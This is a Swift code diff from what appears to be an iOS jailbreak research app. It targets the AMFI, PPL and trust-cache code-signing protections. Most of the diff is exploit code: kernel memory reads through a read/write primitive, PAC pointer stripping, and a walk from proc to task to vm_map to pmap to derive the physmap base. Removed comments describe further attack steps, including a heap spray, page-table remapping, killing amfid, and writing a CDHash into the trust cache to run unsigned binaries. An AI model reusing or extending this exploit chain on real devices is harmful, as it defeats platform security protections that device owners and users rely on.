@@ -149,173 +149,14 @@ struct AMFIExperimentView: View {
             var experimentResults: [ExperimentResult] = []
             
             // Experiments 1-53: REMOVED (legacy probes, see git history)
+            // Experiments 54-73, 75-76: DISABLED (focusing on exp 74)
             
             // ============================================
-            // Experiment 54: IOKit driver probe
-            // ============================================
-            let exp54 = self.expIOKitProbe(rc: rc)
-            experimentResults.append(exp54)
-            
-            // ============================================
-            // Experiment 55: CoreTrust certificate probe
-            // ============================================
-            let exp55 = self.expCoreTrustProbe(rc: rc)
-            experimentResults.append(exp55)
-            
-            // ============================================
-            // Experiment 56: AMFI external method fuzzing
-            // ============================================
-            let exp56 = self.expAMFIExternalMethods()
-            experimentResults.append(exp56)
-            
-            // ============================================
-            // Experiment 57: AppleKeyStore probe (DISABLED â€” not directly useful for AMFI bypass)
-            // ============================================
-            // let exp57 = self.expKeyStoreProbe()
-            // experimentResults.append(exp57)
-            
-            // ============================================
-            // Experiment 58: AMFI struct method deep probe
-            // ============================================
-            let exp58 = self.expAMFIStructProbe()
-            experimentResults.append(exp58)
-            
-            // ============================================
-            // Experiment 59: AMFI from launchd + amfid hunt
-            // ============================================
-            let exp59 = self.expAMFIFromLaunchd(rc: rc)
-            experimentResults.append(exp59)
-            
-            // ============================================
-            // ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 60: amfid kernel research
-            // âš ï¸ DISABLED in batch run â€” RC init can hang/timeout
-            // Use "Test amfid RC" button separately
-            // ============================================
-            experimentResults.append(ExperimentResult(
-                name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ amfid research",
-                success: false,
-                detail: "Use 'Test amfid RC' button (safe kernel reads only)",
-                timestamp: Date()
-            ))
-            
-            // ============================================
-            // ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 61: FINAL ASSAULT
-            // All remaining bypass paths combined
-            // ============================================
-            let exp61 = self.expFinalAssault(rc: rc)
-            experimentResults.append(exp61)
-            
-            // ============================================
-            // ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 62: Trust Cache â€” DISABLED (panic)
-            // Reading __DATA addresses beyond pmap_cs causes panic
-            // Socket KRW zone does NOT extend to trust cache region
-            // ============================================
-            experimentResults.append(ExperimentResult(
-                name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Trust Cache",
-                success: false,
-                detail: "âš ï¸ DISABLED â€” reading trust cache addresses causes panic.\nSocket KRW zone limited to proc/task/pmap_cs area only.\nTrust cache region (~57KB away) is in different zone.",
-                timestamp: Date()
-            ))
-            
-            let exp63 = self.expSSVBypass(rc: rc)
-            experimentResults.append(exp63)
-            
-            let exp64 = self.expCoreTrustResearch(rc: rc)
-            experimentResults.append(exp64)
-            
-            // ============================================
-            // Experiment 65: amfid kill race
-            // Kill amfid + immediately spawn — test if binary runs in window
-            // ============================================
-            let exp65 = self.expAmfidKillRace(rc: rc)
-            experimentResults.append(exp65)
-            
-            // ============================================
-            // Experiment 66: IOKit Driver Fuzzer (LAST TRY)
-            // Targeted fuzzing of AMFI/IOSurface/KeyStore methods
-            // Looking for memory corruption or unexpected behavior
-            // ============================================
-            let exp66 = self.expIOKitFuzzer()
-            experimentResults.append(exp66)
-            
-            // ============================================
-            // Experiment 67: Deep fuzz CredentialManager sel 0
-            // ret=0xfffffffd means code reached — find different path
-            // ============================================
-            let exp67 = self.expCredMgrDeepFuzz()
-            experimentResults.append(exp67)
-            
-            // ============================================
-            // Experiment 68: PPL Bypass via IOSurface Physical Memory
-            // Map physical page from SpringBoard → bypass PPL virtual protection
-            // ============================================
-            let exp68 = self.expPPLPhysicalBypass()
-            experimentResults.append(exp68)
-            
-            // ============================================
-            // Experiment 69: Physical Memory Discovery
-            // Write marker to PurpleGfxMem → scan kernel for it
-            // If found → we know phys↔virt mapping without gPhysBase!
-            // ============================================
-            let exp69 = self.expPhysicalMemoryDiscovery(rc: rc)
-            experimentResults.append(exp69)
-            
-            // ============================================
-            // Experiment 70: Extract physical address from port kobject
-            // We have port 98455 → find kobject → get phys addr
-            // Then calculate trust cache physical address
-            // ============================================
-            let exp70 = self.expExtractPhysAddr(rc: rc)
-            experimentResults.append(exp70)
-            
-            // ============================================
-            // Experiment 71: READ PHYSICAL ADDRESS + MAP TRUST CACHE
-            // We have VM object! Read vm_page → get phys addr
-            // Then: IOSurface map → write CDHash → FULL JAILBREAK!
-            // ============================================
-            let exp71 = self.expPhysAddrToJailbreak(rc: rc)
-            experimentResults.append(exp71)
-            
-            // ============================================
-            // 🎉 Experiment 72: FULL JAILBREAK ATTEMPT
-            // We have physical R/W! Now: find trust cache phys addr
-            // Map it → write CDHash → spawn unsigned → WIN!
-            // ============================================
-            let exp72 = self.expFullJailbreak(rc: rc)
-            experimentResults.append(exp72)
-            
-            // ============================================
-            // Experiment 73: Heap Spray via IOSurface Properties
-            // Allocate in kernel heap (same zone as trust cache)
-            // Try to corrupt trust cache boundary
-            // ============================================
-            let exp73 = self.expHeapSpray()
-            experimentResults.append(exp73)
-            
-            // ============================================
-            // Experiment 74: Physmap Direct Access
-            // Kernel has a 1:1 virtual mapping of ALL physical RAM
-            // If we find physmap base → read trust cache via physmap!
-            // Socket KRW zone doesn't matter — physmap is in __DATA
+            // Experiment 74: Physmap Direct Access (ONLY ACTIVE)
+            // Pointer chain: proc→task→map→pmap→tte/ttep
             // ============================================
             let exp74 = self.expPhysmapAccess(rc: rc)
             experimentResults.append(exp74)
-            
-            // ============================================
-            // Experiment 75: PTE Remap Attack
-            // Walk page tables → find trust cache PTE → modify mapping
-            // Remap trust cache physical page to our controlled VA
-            // ============================================
-            let exp75 = self.expPTERemap(rc: rc)
-            experimentResults.append(exp75)
-            
-            // ============================================
-            // Experiment 76: Kernel Task Port via IPC Traverse
-            // Find kernel_task port in launchd IPC space
-            // Use it to call mach_vm_read → bypass PPL zone limits
-            // ============================================
-            let exp76 = self.expKernelTaskPort(rc: rc)
-            experimentResults.append(exp76)
             
             DispatchQueue.main.async {
                 self.results = experimentResults
@@ -3760,102 +3601,162 @@ struct AMFIExperimentView: View {
         // gVirtBase = gPhysBase + physmap_slide
         // ============================================================
         detail += "\n=== Pointer Chain: proc→task→map→pmap→tte/ttep ===\n"
+        detail += "(All pointers PAC-stripped before use)\n\n"
+        
+        // PAC strip helper: A12 has 40-bit VA, bits[62:40] = PAC
+        // For kernel pointers (bit 39 = 1): force bits[63:40] = 0xFFFFFF
+        func stripPAC(_ ptr: UInt64) -> UInt64 {
+            guard ptr != 0 else { return 0 }
+            let addrMask: UInt64 = 0x000000FFFFFFFFFF  // bits [39:0]
+            let signExt: UInt64  = 0xFFFFFF0000000000  // bits [63:40] all 1s for kernel
+            return (ptr & addrMask) | signExt
+        }
+        
+        // Zone bounds for validation
+        let zoneMin: UInt64 = 0xffffffde9a094000
+        let zoneMax: UInt64 = 0xffffffe49a094000
+        
+        func isZonePtr(_ v: UInt64) -> Bool {
+            return v >= zoneMin && v < zoneMax
+        }
         
         let ourProc = ds_get_our_proc()
         detail += "proc: 0x\(String(format: "%llx", ourProc))\n"
         
-        let procRo = ds_kread64_safe(ourProc + UInt64(off_proc_p_proc_ro))
-        detail += "proc_ro: 0x\(String(format: "%llx", procRo))\n"
+        // Step 1: proc→proc_ro (at +0x10, PAC'd)
+        let procRoRaw = ds_kread64_safe(ourProc + 0x10)
+        let procRo = stripPAC(procRoRaw)
+        detail += "proc_ro raw: 0x\(String(format: "%llx", procRoRaw))\n"
+        detail += "proc_ro stripped: 0x\(String(format: "%llx", procRo))\n"
         
-        let taskAddr = ds_kread64_safe(procRo + UInt64(off_proc_ro_pr_task))
-        detail += "task: 0x\(String(format: "%llx", taskAddr))\n"
+        // Validate: should be in RO zone (0xffffffdf806f8000–0xffffffdfcd3c4000)
+        let inROZone = procRo >= 0xffffffdf806f8000 && procRo < 0xffffffdfcd3c4000
+        detail += "In RO zone: \(inROZone)\n\n"
         
-        if taskAddr != 0 {
-            // task→map at +0x28
-            let vmMap = ds_kread64_safe(taskAddr + 0x28)
-            detail += "vm_map (task+0x28): 0x\(String(format: "%llx", vmMap))\n"
-            
-            if vmMap != 0 {
-                // vm_map→pmap: try offsets 0x40, 0x48, 0x38, 0x50
-                var pmapAddr: UInt64 = 0
-                let pmapOffsets: [UInt64] = [0x40, 0x48, 0x38, 0x50, 0x30]
-                
-                for off in pmapOffsets {
-                    let candidate = ds_kread64_safe(vmMap + off)
-                    if candidate > 0xffffffde00000000 && candidate < 0xffffffe500000000 {
-                        let tte = ds_kread64_safe(candidate + 0x00)
-                        let ttep = ds_kread64_safe(candidate + 0x08)
-                        // tte should be physmap VA (0xffffffe0...), ttep should be physical (0x8...)
-                        if tte > 0xffffffde00000000 && ttep >= 0x800000000 && ttep < 0x900000000 {
-                            pmapAddr = candidate
-                            detail += "pmap (map+0x\(String(format: "%x", off))): 0x\(String(format: "%llx", candidate))\n"
-                            detail += "  tte (physmap VA): 0x\(String(format: "%llx", tte))\n"
-                            detail += "  ttep (physical):  0x\(String(format: "%llx", ttep))\n\n"
-                            
-                            // CALCULATE PHYSMAP!
-                            let physmapSlide = tte &- ttep
-                            let gPhysBaseCalc: UInt64 = 0x800000000
-                            let gVirtBaseCalc = gPhysBaseCalc &+ physmapSlide
-                            
-                            detail += "🎉🎉🎉 PHYSMAP CALCULATED! 🎉🎉🎉\n"
-                            detail += "physmap_slide = tte - ttep = 0x\(String(format: "%llx", physmapSlide))\n"
-                            detail += "gPhysBase = 0x800000000 (A12 constant)\n"
-                            detail += "gVirtBase = 0x\(String(format: "%llx", gVirtBaseCalc))\n\n"
-                            
-                            // Verify range
-                            if gVirtBaseCalc > 0xffffffde00000000 && gVirtBaseCalc < 0xffffffe500000000 {
-                                detail += "✅ gVirtBase in expected GEN2/GEN3 range!\n\n"
-                                
-                                // ULTIMATE TEST: read kernel base via physmap
-                                let kernPhys = kernBase &- gVirtBaseCalc &+ gPhysBaseCalc
-                                let physmapVA = gVirtBaseCalc &+ (kernPhys &- gPhysBaseCalc)
-                                let verifyVal = ds_kread64_safe(physmapVA)
-                                
-                                detail += "Kernel phys: 0x\(String(format: "%llx", kernPhys))\n"
-                                detail += "Physmap VA: 0x\(String(format: "%llx", physmapVA))\n"
-                                detail += "Read via physmap: 0x\(String(format: "%llx", verifyVal))\n"
-                                detail += "Read direct: 0x\(String(format: "%llx", kernMagic))\n\n"
-                                
-                                if verifyVal == kernMagic && kernMagic != 0 {
-                                    detail += "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n"
-                                    detail += "PHYSMAP FULLY VERIFIED!\n"
-                                    detail += "ANY physical address → kernel VA!\n"
-                                    detail += "PPL ZONE ISOLATION BYPASSED!\n"
-                                    detail += "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n\n"
-                                    detail += "FULL JAILBREAK PATH OPEN!\n"
-                                    detail += "Next: find trust cache → write CDHash → spawn!\n"
-                                    foundPhysBase = gPhysBaseCalc
-                                    foundVirtBase = gVirtBaseCalc
-                                } else {
-                                    detail += "Physmap read doesn't match — offset might be slightly off\n"
-                                    detail += "But tte/ttep values look correct!\n"
-                                    foundPhysBase = gPhysBaseCalc
-                                    foundVirtBase = gVirtBaseCalc
-                                }
-                            } else {
-                                detail += "⚠️ gVirtBase out of range — pmap offsets wrong\n"
-                            }
-                            break
-                        }
-                    }
-                }
-                
-                if pmapAddr == 0 {
-                    detail += "pmap not found. vm_map dump:\n"
-                    for off in stride(from: UInt64(0), to: UInt64(0x60), by: 8) {
-                        let v = ds_kread64_safe(vmMap + off)
-                        detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\n"
-                    }
-                }
-            } else {
-                detail += "vm_map is NULL. task dump:\n"
-                for off in stride(from: UInt64(0), to: UInt64(0x50), by: 8) {
-                    let v = ds_kread64_safe(taskAddr + off)
-                    detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\n"
+        // Step 2: proc_ro→pr_task (at +0x00, PAC'd)
+        let taskRaw = ds_kread64_safe(procRo + 0x00)
+        let taskAddr = stripPAC(taskRaw)
+        detail += "task raw: 0x\(String(format: "%llx", taskRaw))\n"
+        detail += "task stripped: 0x\(String(format: "%llx", taskAddr))\n"
+        detail += "In zone: \(isZonePtr(taskAddr))\n\n"
+        
+        guard isZonePtr(taskAddr) else {
+            detail += "❌ task not in zone range after PAC strip\n"
+            detail += "Trying proc_ro at alternative offsets...\n"
+            // Try reading proc_ro from off_proc_p_proc_ro offset too
+            let altRaw = ds_kread64_safe(ourProc + UInt64(off_proc_p_proc_ro))
+            let altStripped = stripPAC(altRaw)
+            detail += "  proc+off_proc_p_proc_ro raw: 0x\(String(format: "%llx", altRaw))\n"
+            detail += "  stripped: 0x\(String(format: "%llx", altStripped))\n"
+            let success = false
+            return ExperimentResult(name: "Physmap Access (Exp 74)", success: success, detail: detail, timestamp: Date())
+        }
+        
+        // Step 3: task→vm_map (scan +0x20 to +0x40 for zone pointer)
+        detail += "=== Scanning task for vm_map ===\n"
+        var vmMap: UInt64 = 0
+        var vmMapOff: UInt64 = 0
+        
+        for off: UInt64 in stride(from: 0x20, to: 0x48, by: 8) {
+            let candidate = ds_kread64_safe(taskAddr + off)
+            if isZonePtr(candidate) {
+                // Verify: vm_map has links at +0x10/+0x18 that are also zone pointers
+                let hdrFwd = ds_kread64_safe(candidate + 0x10)
+                let hdrBwd = ds_kread64_safe(candidate + 0x18)
+                if isZonePtr(hdrFwd) && isZonePtr(hdrBwd) {
+                    vmMap = candidate
+                    vmMapOff = off
+                    detail += "vm_map at task+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", candidate)) ✅\n"
+                    detail += "  hdr.next: 0x\(String(format: "%llx", hdrFwd))\n"
+                    detail += "  hdr.prev: 0x\(String(format: "%llx", hdrBwd))\n\n"
+                    break
                 }
             }
-        } else {
-            detail += "❌ task is NULL\n"
+        }
+        
+        guard vmMap != 0 else {
+            detail += "vm_map not found. task dump (stripped reads):\n"
+            for off: UInt64 in stride(from: 0, to: 0x60, by: 8) {
+                let v = ds_kread64_safe(taskAddr + off)
+                let inZone = isZonePtr(v) ? " ← zone" : ""
+                detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\(inZone)\n"
+            }
+            let success = false
+            return ExperimentResult(name: "Physmap Access (Exp 74)", success: success, detail: detail, timestamp: Date())
+        }
+        
+        // Step 4: vm_map→pmap (scan +0x28 to +0x50 for zone ptr with tte/ttep)
+        detail += "=== Scanning vm_map for pmap ===\n"
+        var pmapAddr: UInt64 = 0
+        
+        for off: UInt64 in stride(from: 0x28, to: 0x58, by: 8) {
+            let candidate = ds_kread64_safe(vmMap + off)
+            if !isZonePtr(candidate) { continue }
+            
+            // pmap→tte at +0x00 should be physmap VA (zone range)
+            // pmap→ttep at +0x08 should be physical address (0x8...)
+            let tte = ds_kread64_safe(candidate + 0x00)
+            let ttep = ds_kread64_safe(candidate + 0x08)
+            
+            if isZonePtr(tte) && ttep >= 0x800000000 && ttep < 0xC00000000 {
+                pmapAddr = candidate
+                detail += "pmap at map+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", candidate)) ✅\n"
+                detail += "  tte (physmap VA): 0x\(String(format: "%llx", tte))\n"
+                detail += "  ttep (physical):  0x\(String(format: "%llx", ttep))\n\n"
+                
+                // CALCULATE PHYSMAP!
+                let physmapSlide = tte &- ttep
+                let gPhysBaseCalc: UInt64 = 0x800000000
+                let gVirtBaseCalc = gPhysBaseCalc &+ physmapSlide
+                
+                detail += "🎉🎉🎉 PHYSMAP CALCULATED! 🎉🎉🎉\n"
+                detail += "physmap_slide = tte - ttep = 0x\(String(format: "%llx", physmapSlide))\n"
+                detail += "gPhysBase = 0x800000000 (A12 constant)\n"
+                detail += "gVirtBase = 0x\(String(format: "%llx", gVirtBaseCalc))\n\n"
+                
+                // Verify range
+                if gVirtBaseCalc > 0xffffffde00000000 && gVirtBaseCalc < 0xffffffe500000000 {
+                    detail += "✅ gVirtBase in expected zone range!\n\n"
+                    
+                    // ULTIMATE TEST: read kernel base via physmap
+                    let kernPhys = kernBase &- gVirtBaseCalc &+ gPhysBaseCalc
+                    let physmapVA = gVirtBaseCalc &+ (kernPhys &- gPhysBaseCalc)
+                    let verifyVal = ds_kread64_safe(physmapVA)
+                    
+                    detail += "Kernel phys: 0x\(String(format: "%llx", kernPhys))\n"
+                    detail += "Physmap VA: 0x\(String(format: "%llx", physmapVA))\n"
+                    detail += "Read via physmap: 0x\(String(format: "%llx", verifyVal))\n"
+                    detail += "Read direct: 0x\(String(format: "%llx", kernMagic))\n\n"
+                    
+                    if verifyVal == kernMagic && kernMagic != 0 {
+                        detail += "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n"
+                        detail += "PHYSMAP FULLY VERIFIED!\n"
+                        detail += "ANY physical address → kernel VA!\n"
+                        detail += "PPL ZONE ISOLATION BYPASSED!\n"
+                        detail += "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n\n"
+                        detail += "FULL JAILBREAK PATH OPEN!\n"
+                        detail += "Next: find trust cache → write CDHash → spawn!\n"
+                        foundPhysBase = gPhysBaseCalc
+                        foundVirtBase = gVirtBaseCalc
+                    } else {
+                        detail += "Physmap verify mismatch — but tte/ttep look valid\n"
+                        foundPhysBase = gPhysBaseCalc
+                        foundVirtBase = gVirtBaseCalc
+                    }
+                } else {
+                    detail += "⚠️ gVirtBase out of expected range\n"
+                }
+                break
+            }
+        }
+        
+        if pmapAddr == 0 {
+            detail += "pmap not found. vm_map dump:\n"
+            for off: UInt64 in stride(from: 0, to: 0x60, by: 8) {
+                let v = ds_kread64_safe(vmMap + off)
+                let inZone = isZonePtr(v) ? " ← zone" : ""
+                detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\(inZone)\n"
+            }
         }
         
         let success = foundPhysBase != 0 && foundVirtBase != 0
